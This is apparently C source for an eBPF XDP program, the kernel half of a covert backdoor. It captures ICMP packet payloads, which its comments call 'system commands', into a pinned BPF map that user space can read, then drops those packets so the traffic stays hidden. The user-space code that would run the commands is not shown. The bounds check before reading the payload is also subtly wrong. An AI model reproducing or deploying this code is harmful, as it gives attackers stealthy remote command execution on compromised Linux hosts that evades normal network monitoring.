#include <linux/ip.h>
#include <linux/in.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/icmp.h>
#include <linux/bpf.h>
#include <stdint.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>

#define MAX_STRING_LEN 256


char LICENSE[] SEC("license") = "GPL";


// This function compares str1 and str2, if they are equal, return TRUE.
static inline int compare_strings(const char *str1, const char *str2, int len) {
    int i;
    for (i = 0; i < len; i++) {
        if (str1[i] != str2[i]) {
            return 0;  // Strings are not equal
        }
    }
    return 1;  // Strings are equal
}


// This struct CREATES a map in memory, data can be sent
// into it from here and accessed from user space by name.
// (my_map)
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, __u32);
    __type(value, char[MAX_STRING_LEN]);
    __uint(max_entries, 1024);
    __uint(pinning, LIBBPF_PIN_BY_NAME);
} my_map SEC(".maps");


// This program hooks packets at the NIC level. every
// packet is checked to be an icmp packet with an arbitrary
// data section, if so some data will be sent to the map.

// Many of the conditions are made so that the eBPF
// verifier will not suspect out of bounds access.
SEC("xdp")
int xdp_program(struct xdp_md *ctx)
{
    __u32 key = 1;
    char *compare_data = "abcdef";
    void *data = (void *)(long)ctx->data;
    void *data_end = (void *)(long)ctx->data_end;
    struct ethhdr *eth = data;
    uint32_t cur = sizeof(*eth);

    if (data + cur > data_end)
        return XDP_PASS;

    if (eth->h_proto != bpf_htons(ETH_P_IP))
        return XDP_PASS;

    struct iphdr *iph = data + cur;
    cur += sizeof(*iph);

    if (data + cur > data_end)
        return XDP_PASS;

    if (iph->protocol != IPPROTO_ICMP)
        return XDP_PASS;

    struct icmphdr *icmph = data + cur;
    cur += sizeof(*icmph);

    if (data + cur + sizeof(compare_data) > data_end)
        return XDP_PASS;
	
    char *icmp_data = (char *)(data + cur);
    char buffer[MAX_STRING_LEN];
	
	// Check if the icmp data section is arbitrary.
    if (compare_strings(icmp_data, compare_data, 6)) {
        return XDP_PASS;
    }
    bpf_probe_read_kernel(buffer, sizeof(buffer), icmp_data);
	
	// Send the arbitrary icmp data (system commands)
	// through the map and drop the packet.
    if (bpf_map_update_elem(&my_map, &key, buffer, BPF_ANY) != 0){
        bpf_printk("Failed to Write!!!");
		return XDP_PASS;
    }
    return XDP_DROP;
}
